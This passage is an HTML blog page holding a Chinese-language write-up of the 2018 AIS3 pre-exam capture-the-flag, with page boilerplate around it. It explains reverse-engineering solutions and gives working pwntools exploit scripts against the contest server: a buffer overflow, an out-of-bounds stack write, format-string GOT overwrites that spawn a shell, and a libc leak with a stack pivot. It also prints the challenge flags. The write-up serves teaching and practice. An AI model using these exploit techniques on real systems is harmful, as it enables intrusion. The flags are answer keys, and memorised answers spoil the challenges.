@@ -1,0 +1,1592 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta name="description" content="時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間題目都還滿簡單的，有些題目滿有趣的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018::AIS3::pre-exam">
+<meta property="og:image">
+<meta property="og:url" content="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/index.html">
+<meta property="og:site_name" content="NiNi&#39;s den">
+<meta property="og:description" content="時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間題目都還滿簡單的，有些題目滿有趣的">
+<meta property="og:locale" content="tw">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/scoreboard.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/rev2_origin.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/rev2_patch.png">
+<meta property="article:published_time" content="2018-06-13T03:20:22.000Z">
+<meta property="article:modified_time" content="2020-07-05T13:15:30.019Z">
+<meta property="article:author" content="Terrynini">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="AIS3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.terrynini.tw/tw/2018-AIS3-pre-exam/scoreboard.png">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Terrynini">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Terrynini">
+    
+    <meta name="keywords" content="NiNi's den,Terrynini">
+    
+    <meta name="description" content="">
+
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>2018::AIS3::pre-exam · NiNi&#39;s Den</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "//avatars2.githubusercontent.com/u/15998206?s=400&u=a9da7956108c466fb27481f535959a5dd8861d74&v=4" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-109652024-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-109652024-2');
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >🦊Back to NiNi&#39;s Den</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2018::AIS3::pre-exam</a>
+            </div>
+    </div>
+    
+    
+    <a class="home-link" style="font-size: larger;" href=/>🦊Back to NiNi's Den</a>
+    
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/DSC00041.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2018::AIS3::pre-exam
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "AIS3">AIS3</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">3.4k</span>Reading time: <span class="post-count reading-time">15 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/06/13</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>時隔一年又是 AIS3，去年因為去日本沒拿到結業證書，還沒打到 final，虧<br>今年大家又跑來參加，反正暑假大概也是沒事做，看看這次 final 有沒有什麼好康的<br>這次 pre-exam 成績上升到了 2nd ，本來可以再多解一題，總之又是粗心的壞習慣增加了構造 payload 的時間<br>題目都還滿簡單的，有些題目滿有趣的</p>
+<a id="more"></a>
+<p>先附上人權，聊天室好像有人以為我是出題者，我只是覺得抱怨題目可以，但是你要給出邏輯Ｒ<br>大家都有解這題，都要花時間，就是有人解得快啊<br>不然就倒著解，50 - 2 還有 48 分直接衝上第一Ｒ<br>簡單的太難解，你有試過先解難的嗎</p>
+<img src="/tw/2018-AIS3-pre-exam/scoreboard.png" class="">
+
+<h1 id="Rev-1-find"><a href="#Rev-1-find" class="headerlink" title="Rev-1:find"></a>Rev-1:find</h1><p>題目名字我有點忘了，應該是 find 拉，反正他就是一個什麼都沒有的 ELF 要你找 flag，就 strings 下去，就會發現一堆 <code>AIS3</code>，<code>ais3</code> 的字樣，小寫的都是一些對話，大寫的有一堆大括號，不過中間有偷夾個flag</p>
+<p><code>AIS3{StrINg$_And_gR3P_I5_U$eFu1}</code></p>
+<hr>
+<h1 id="Rev-2-secret"><a href="#Rev-2-secret" class="headerlink" title="Rev-2:secret"></a>Rev-2:secret</h1><p>總之這程式裡面有個區塊是寫好的密文，從<code>init</code>可以發現他原始加密的方式就是<code>srand(0)</code>之後，一直呼叫<code>rand()%2018</code>然後<code>xor</code>後，就是這段<code>secret</code>的值，所以他程式才會一直要你輸入，只要你的輸入能夠還原當初他亂數的過程，<code>xor</code>出來的就會是<code>flag</code>，他會把解密的<code>flag</code>放到<code>/tmp/secret</code>裡面，原本程式的邏輯是這樣：</p>
+<img src="/tw/2018-AIS3-pre-exam/rev2_origin.png" class="">
+
+<p>從組語那邊把他 patch 成這樣：</p>
+<img src="/tw/2018-AIS3-pre-exam/rev2_patch.png" class="">
+
+<p>跑完就有 flag 了</p>
+<p><strong>AIS3{tHere_1s_a_VErY_VerY_VeRY_1OoO00O0oO0OOoO0Oo000OOoO00o00oG_f1@g_iN_my_m1Nd}</strong></p>
+<hr>
+<h1 id="Rev-3-crackme"><a href="#Rev-3-crackme" class="headerlink" title="Rev-3:crackme"></a>Rev-3:crackme</h1><p>就是一個 crackme 的樣子，.NET 寫的，用工具把 .NET 的 IR decompile 回類似 C# 的程式，就會找到關鍵的<code>xor</code>的部分，他裡面有一堆<code>yanny</code>，<code>laurel</code>之類的變數，寫個腳本讓每個變數 xor 171 就是 flag 了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher = <span class="string">"""// Token: 0x0400000A RID: 10\n\t\tprivate const int yanny = 234;\n\n\t\t// Token: 0x0400000B RID: 11\n\t\tprivate const int laurel = 226;\n\n\t\t// Token: 0x0400000C RID: 12\n\t\tprivate const int yammy = 248;\n\n\t\t// Token: 0x0400000D RID: 13\n\t\tprivate const int laurol = 152;\n\n\t\t// Token: 0x0400000E RID: 14\n\t\tprivate const int yommy = 208;\n\n\t\t// Token: 0x0400000F RID: 15\n\t\tprivate const int lourel = 154;\n\n\t\t// Token: 0x04000010 RID: 16\n\t\tprivate const int yonmy = 223;\n\n\t\t// Token: 0x04000011 RID: 17\n\t\tprivate const int lauril = 244;\n\n\t\t// Token: 0x04000012 RID: 18\n\t\tprivate const int yamny = 226;\n\n\t\t// Token: 0x04000013 RID: 19\n\t\tprivate const int laure1 = 158;\n\n\t\t// Token: 0x04000014 RID: 20\n\t\tprivate const int yanmy = 244;\n\n\t\t// Token: 0x04000015 RID: 21\n\t\tprivate const int lauro1 = 238;\n\n\t\t// Token: 0x04000016 RID: 22\n\t\tprivate const int yammi = 234;\n\n\t\t// Token: 0x04000017 RID: 23\n\t\tprivate const int loure1 = 216;\n\n\t\t// Token: 0x04000018 RID: 24\n\t\tprivate const int yemmy = 210;\n\n\t\t// Token: 0x04000019 RID: 25\n\t\tprivate const int leurel = 244;\n\n\t\t// Token: 0x0400001A RID: 26\n\t\tprivate const int yemny = 223;\n\n\t\t// Token: 0x0400001B RID: 27\n\t\tprivate const int leural = 228;\n\n\t\t// Token: 0x0400001C RID: 28\n\t\tprivate const int yenmy = 244;\n\n\t\t// Token: 0x0400001D RID: 29\n\t\tprivate const int leurol = 232;\n\n\t\t// Token: 0x0400001E RID: 30\n\t\tprivate const int yenny = 249;\n\n\t\t// Token: 0x0400001F RID: 31\n\t\tprivate const int leuro1 = 159;\n\n\t\t// Token: 0x04000020 RID: 32\n\t\tprivate const int yenmi = 200;\n\n\t\t// Token: 0x04000021 RID: 33\n\t\tprivate const int louro1 = 192;\n\n\t\t// Token: 0x04000022 RID: 34\n\t\tprivate const int yomny = 244;\n\n\t\t// Token: 0x04000023 RID: 35\n\t\tprivate const int leure1 = 230;\n\n\t\t// Token: 0x04000024 RID: 36\n\t\tprivate const int yonny = 206;\n\n\t\t// Token: 0x04000025 RID: 37\n\t\tprivate const int lauri1 = 138;\n\n\t\t// Token: 0x04000026 RID: 38\n\t\tprivate const int yamni = 214;"""</span>.split(<span class="string">' = '</span>)[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">flag =  <span class="string">''</span>.join(map(chr,[ int(x[:<span class="number">3</span>])^<span class="number">171</span> <span class="keyword">for</span> x <span class="keyword">in</span> cipher]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{1t_I5_EAsy_tO_CR4ck_Me!}</strong></p>
+<hr>
+<h1 id="Rev-4-calc"><a href="#Rev-4-calc" class="headerlink" title="Rev-4:calc"></a>Rev-4:calc</h1><p>我還以為又是 windows 的計算機，原來是 Golang，他沒把 debug 訊息拿掉，看起來很快，程式要你輸入兩把 key ，然後把兩個陣列中的每個字元都對應相加，如果跟他程式內存的一個陣列相同的話 sever 就會把 flag 吐給你，輸入有限制，最長的 key 長度應該要是 0x19 ，這裡他題目有說 Unicode ，其實就是 Golang 中<code>rune</code>的特性，如果是用別的陣列，存取 Unicode 的時候會被拆解成多個 byte，但是<code>rune</code>會照著 Unicode 切，也就是<code>int32</code>的大小，而他程式中用來驗證的那個陣列也是<code>rune</code>，當中有包含 Unicode<br>這題也不用去把它拆成兩把 key，就把第二把 key 空著，把它程式裡面那個數值直接當第一把 key 送進去就會過了<br>然後因為 Golang 跟 gdb 之間有點小問題，所以用 gdb 在本地跑 payload 會跑不過</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2115</span>)</span><br><span class="line"></span><br><span class="line">a = [<span class="string">u'\ufffd'</span>,<span class="string">u'\u006d'</span>,<span class="string">u'\ufffd'</span>,<span class="string">u'\u000f'</span>,<span class="string">u'\u006f'</span>,<span class="string">u'\u0058'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0031'</span>,<span class="string">u'\u0073'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u0048'</span>,<span class="string">u'\u0030'</span>,<span class="string">u'\u0000'</span>,<span class="string">u'\ufffd'</span>,<span class="string">u'\u0053'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0063'</span>,<span class="string">u'\u0054'</span>,<span class="string">u'\u0046'</span>,<span class="string">u'\u0020'</span>,<span class="string">u'\u0074'</span>,<span class="string">u'\u003a'</span>,<span class="string">u'\u006d'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>.join(a).encode(<span class="string">"utf8"</span>))</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline()</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{G0_gO_g0_T0_h1Gh_!!!_R3v3rs3_oN_g0lauG_p1narY_1s_3xHanst3d_Orz}</strong></p>
+<hr>
+<h1 id="Pwn-1-mail"><a href="#Pwn-1-mail" class="headerlink" title="Pwn-1:mail"></a>Pwn-1:mail</h1><p>程式有個 <code>reply</code> function，只要跳進去就給 flag，程式的輸入是用<code>gets</code>，直接 buffer overflow 就好了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2111</span>)</span><br><span class="line"></span><br><span class="line">reply = p64(<span class="number">0x400796</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"reciever: "</span>)</span><br><span class="line">r.sendline(<span class="string">"terrynini"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">r.sendline(cyclic(<span class="number">840</span>)+reply)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!<em>I</em>d0nt_3ant_t0_giu3_QwQ}</strong></p>
+<hr>
+<h1 id="Pwn-2-darling"><a href="#Pwn-2-darling" class="headerlink" title="Pwn-2:darling"></a>Pwn-2:darling</h1><p>忘記補進度了，考完段考來看 darling，這題只限制了上界沒限制下界，所以能夠改寫 stack ，雖然不能改掉現在這個 stack frame 的 return address，但是可以修改後面的，把 printf 的 return address 改掉就好了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"104.199.235.135"</span>, <span class="number">2112</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">r.sendline(<span class="string">"-5"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Code: "</span>)</span><br><span class="line">r.sendline(<span class="string">"4196310"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{r3w3mpeR_t0_CH3cK_b0tH_uPb3r_b0nud_&amp;_10w3r_bounp}</strong></p>
+<hr>
+<h1 id="Pwn-3-justfmt"><a href="#Pwn-3-justfmt" class="headerlink" title="Pwn-3:justfmt"></a>Pwn-3:justfmt</h1><p>這裡有 format string 的漏洞，我們可以把 got 表中的<code>vprintf</code>(<code>0x4f040</code>)修改成鄰近的<code>__libc_system</code>(<code>0x46590</code>)，不過從右邊數來第二個 byte 因為受到 ASLR 的影響要撞 $\frac{1}{16}$ 的機率</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2113</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> r.recvuntil(<span class="string">":"</span>)</span><br><span class="line"></span><br><span class="line">        plt = <span class="number">0x601030</span></span><br><span class="line">        r.sendline(<span class="string">"sh\n\n%21900c%8$hn"</span>+p64(plt))</span><br><span class="line">        m = r.recvuntil(p64(plt))</span><br><span class="line">        r.sendline(<span class="string">"ls"</span>)</span><br><span class="line">        m = r.recv()</span><br><span class="line">        r.interactive()</span><br><span class="line">        <span class="keyword">print</span> m</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"try again"</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{fMt_stR1n6_1s_H4rp_s0w3t1meS_dnt_1ts_fnu!!}</strong></p>
+<hr>
+<h1 id="Pwn-4-MagicWorld"><a href="#Pwn-4-MagicWorld" class="headerlink" title="Pwn-4:MagicWorld"></a>Pwn-4:MagicWorld</h1><p>這題一樣有 format string 的問題，我們可以 leak 在 stack 上面<code>main</code>的 return address 來找到 <code>libc_start_main</code>，推算 libc base，然後找到 one gadget的位置<br>在<code>Try a spell</code>選項裡面有多讀一個 byte，我們可以用這個 byte 來做 stack pivot，然後控制 rip 流程，跳到 one gadget 裡面，就可以拿到 shell 了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = remote(<span class="string">"104.199.235.135"</span>,<span class="number">2114</span>)</span><br><span class="line"></span><br><span class="line">        magic = <span class="number">0x46428</span></span><br><span class="line"></span><br><span class="line">        r.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"1"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"spell: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"Regist: "</span>)</span><br><span class="line">        r.sendline(<span class="string">"2"</span>)</span><br><span class="line">        libc = r.recvuntil(<span class="string">"\n"</span>)[<span class="number">-16</span>:<span class="number">-1</span>].split(<span class="string">"x"</span>)</span><br><span class="line">        <span class="keyword">print</span> libc</span><br><span class="line">        libc = int(libc[len(libc)<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"libc_start_main: "</span> +hex(libc)</span><br><span class="line">        libc =  libc - <span class="number">0x21f45</span></span><br><span class="line">        magic = libc+magic</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"libc_base: "</span> +hex(libc)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"magic: "</span> + hex(magic)</span><br><span class="line"></span><br><span class="line">        spell_rbp = p64(magic).ljust(<span class="number">16</span>,<span class="string">"\0"</span>) + <span class="string">"h"</span></span><br><span class="line">        <span class="keyword">print</span> spell_rbp</span><br><span class="line">        r.recvuntil(<span class="string">"Give me your spell: "</span>)</span><br><span class="line">        r.send(spell_rbp)</span><br><span class="line">        r.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"try again"</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>AIS3{m1gRatlon_&amp;_b0f_13_Qu1t3_3asY!!!}</strong></p>
+<hr>
+<h1 id="Crypto-1-POW"><a href="#Crypto-1-POW" class="headerlink" title="Crypto-1:POW"></a>Crypto-1:POW</h1><p>總之讓你算 proof of work，為後面的題目做準備，然後我在聊天室有看到有人說 pool 對就會算得快，基本上這概念是錯的<br>這裡的 proof of work 其實就是 hashcash 也就是 blockchain 裡面那個鬼東西，如果有個特定的 pool 算比較快……，可以讓我投資嗎？<br>總之這邊就是 +1 +1 這樣慢慢算，不要用隨機的，程式裡的隨機是 pseudo random ，會一直撞到剛剛算過的值</p>
+<p><strong>AIS3{Spid3r mAn - H3L1O wOR1d PrO0F 0F WOrK}</strong></p>
+<hr>
+<h1 id="Crypto-2-XOR"><a href="#Crypto-2-XOR" class="headerlink" title="Crypto-2:XOR"></a>Crypto-2:XOR</h1><p>他把明文跟 key 串接在一起，然後用 key 對這個新的字串做 xor 加密，<code>encrypt.py</code>中看得出來 key 的長度在 8~12，這種加密會造成的問題是，可以用最後 8~12 個字元，來推算出 key 的長度<br>從 flag 形式可以知道明文開頭是 <code>AIS3{</code> ，用密文做 xor 得到 key 的前五個 byte，測試一下會發現 key 長度是 10 ，然後把 key 剩下的部分炸開就好了</p>
